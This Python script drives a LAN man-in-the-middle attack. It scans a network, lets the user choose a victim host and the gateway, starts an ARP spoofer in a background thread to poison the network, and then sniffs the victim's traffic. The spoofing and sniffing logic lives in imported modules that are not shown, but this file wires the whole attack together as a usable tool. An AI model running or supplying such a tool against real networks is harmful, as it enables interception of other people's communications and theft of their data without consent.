import capture as capture
import arpSpoof as arpspoof
import lanScan as lanscan
import threading
import time

# get user input to either capture own traffic or any other host traffic on LAN
# then start the lan scan
# ask user for a target ip (then in the script get the host ip and mac)
# then start the spoof with those two : target ip and target mac

def main():
    scan_option = input("Capture services on own host or any other from LAN (own/other): ")

    if scan_option == "own":
        capture.start_sniffer()

    elif scan_option == "other":
        target_network = input("Target Network to scan: ")

        hosts = lanscan.scan_lan(target_network)

        if not hosts:
            print("Hosts not found on the network. Quitting.")
            return

        print("\nAvailable Hosts: ")

        for i, host in enumerate(hosts):
            print(f"{i + 1}. {host['ip']} -> {host['mac']}")

        try:
            choice = int(input("\nChoose a host (number): ")) - 1
            if 0 <= choice < len(hosts):
                target_ip = hosts[choice]['ip']
                gateway_ip = input("Enter the LAN Router (Gateway) IP: ")

                print(f"[*] Target selected: {target_ip}")
                
                # 1. Start the ARP Spoofer in a background thread
                # daemon=True means this thread will auto-kill when we stop the main script
                spoof_thread = threading.Thread(
                    target=arpspoof.start_spoofing, 
                    args=(target_ip, gateway_ip), 
                    daemon=True
                )
                spoof_thread.start()

                # 2. Give the spoofer a couple of seconds to poison the network
                time.sleep(2)

                # 3. Start the sniffer on the main thread
                # When you hit Ctrl+C, it will stop the sniffer and the daemon spoof thread
                capture.start_sniffer()
                
            else:
                print("Invalid choice.")

        except ValueError:
            print("Please enter a valid number.")


if __name__ == "__main__":
    main()